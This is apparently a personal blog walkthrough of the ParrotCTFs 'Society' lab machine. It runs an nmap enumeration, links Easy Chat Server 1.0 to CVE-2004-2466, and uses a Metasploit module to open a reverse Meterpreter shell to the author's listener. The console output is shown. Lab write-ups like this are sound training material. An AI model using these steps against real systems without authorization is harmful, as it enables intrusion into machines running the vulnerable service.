---
title: "ParrotCTFs Society Walkthrough"
description: "ParrotCTFs machine walkthrough"
date: 2025-05-24
categories: [Walkthrough]
tags: [ParrotCTFs,Society, CVE-2004-2466, Easy Chat Server]
image :
    path : https://s3.parrot-ctfs.com/hacking/machines/society_beginner_ctf.png
---

Another Windows Machine Society from ParrotCTFs , this room is Professional Labs you can also try it if you want , Here : [Machine Link](https://parrot-ctfs.com/dashboard/box?boxID=3534453498) , its very straight forward solution to rooting the machine . This machine is targeting the personal, starting in cybersecurity. 

| Name        | Society                                                                                                                                                                                                                              |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Difficulty  | Easy                                                                                                                                                                                                                                 |
| Category    | Buffer Overflow                                                                                                                                                                                                                      |
| Description | Welcome society, a virtual world where the only currency is words, and the conversations never stop. Our servers are like a bustling cafe where people come to chat, share stories, and connect with others from all over the world. |


So let's start: 

- First we can connect with the vpn 

![Image](https://api.pcloud.com/getpubthumb?code=XZXmNh5ZN6q4tAIjoEub7iYUyjVuuhESUXVX&linkpassword=&size=271x157&crop=0&type=auto)

- now we can start the machine ( if machine not seems to work , do reset and try again ) 

![Image](https://api.pcloud.com/getpubthumb?code=XZcppS5ZGzFTluz62PJJLyHPPs3thVXOBrzk&linkpassword=&size=609x547&crop=0&type=auto)

- check if machine is accessible or not 

![Image](https://api.pcloud.com/getpubthumb?code=XZPHpS5Z4NBtwMemFk09Tzsx20Pws4iwyKqV&linkpassword=&size=609x217&crop=0&type=auto)

### <span style="color: DarkSalmon;"><b># Enumeration</b></span>
----

- let's first start with the basic nmap scan ...

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sC -sV -p- 10.53.0.55 --min-rate=1500 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 23:12 EDT
Nmap scan report for 10.53.0.55
Host is up (0.20s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Easy Chat Server httpd 1.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Easy Chat Server httpd 1.0
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DESKTOP-UT6N7VL
| Not valid before: 2025-01-19T03:52:19
|_Not valid after:  2025-07-21T03:52:19
|_ssl-date: 2025-04-08T04:25:22+00:00; -45d22h51m05s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DESKTOP-UT6N7VL
|   NetBIOS_Domain_Name: DESKTOP-UT6N7VL
|   NetBIOS_Computer_Name: DESKTOP-UT6N7VL
|   DNS_Domain_Name: DESKTOP-UT6N7VL
|   DNS_Computer_Name: DESKTOP-UT6N7VL
|   Product_Version: 10.0.19041
|_  System_Time: 2025-04-08T04:24:09+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DESKTOP-UT6N7VL, NetBIOS user: <unknown>, NetBIOS MAC: c6:dc:c8:ef:e3:7f (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-08T04:24:08
|_  start_date: N/A
|_clock-skew: mean: -45d22h51m05s, deviation: 0s, median: -45d22h51m05s
```

- i find out the at port 80 , `Easy Chat Server httpd 1.0` service is running and other ports are open too . 

![Image](https://api.pcloud.com/getpubthumb?code=XZWzpS5Z8eHUrXIylt7iiVp7NCEoPma0GNKy&linkpassword=&size=1612x416&crop=0&type=auto)

- i search this service name on the google and find out that version is vulnerable and assigned a cve ( CVE-2004-2466 ) as category is already mentioned in the lab details , help more accurate search.

![Image](https://api.pcloud.com/getpubthumb?code=XZwzpS5Z7IGNs4evXq528G6zS55N3uegtYvX&linkpassword=&size=1155x572&crop=0&type=auto)

- then i look in to the metasploit for module to this vulnerability or CVE . 
- and i find out one.

![Image](https://api.pcloud.com/getpubthumb?code=XZrzpS5ZedVpucgq6X5XPLkn17i7p0Etf1uk&linkpassword=&size=1312x333&crop=0&type=auto)

### <span style="color: DarkSalmon;"><b># Exploitation</b></span>
-----

- let's select the module and see the options for this module , which have to be set before running this . 
- we can also check before running this , that it is indeed vulnerable or not and it is bytheway

![Image](https://api.pcloud.com/getpubthumb?code=XZHRpS5ZQ2GaLJU1QBLCWjQekca4qRDhu3Py&linkpassword=&size=796x117&crop=0&type=auto)

- now i had setup all the options required for this module , let's exploit it 

```bash
msf6 exploit(windows/http/efs_easychatserver_username) > exploit
[*] Started reverse TCP handler on 10.14.0.15:4444 
[*] Sending request (612 bytes) to target (Easy Chat Server 2.1 - 3.1)
[*] Sending stage (177734 bytes) to 10.53.0.55
[*] Meterpreter session 1 opened (10.14.0.15:4444 -> 10.53.0.55:61022) at 2025-05-23 23:15:10 -0400

meterpreter > getuid
Server username: DESKTOP-UT6N7VL\jacob
```

- now i have shell of jacob ( you can check `help` menu for command in metasploit )
- we got flag file in the Desktop folder of jocob , and this file says that this flag is for both user and root , so no need for privilege escalation . 

![Image](https://api.pcloud.com/getpubthumb?code=XZCRpS5ZesUdPkWKGMzs5QwsgBHr1k9cUPj7&linkpassword=&size=798x497&crop=0&type=auto)

<br>

### <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>

I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts — my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor) <br>
[Machine Platform](https://parrot-ctfs.com/dashboard) <br>
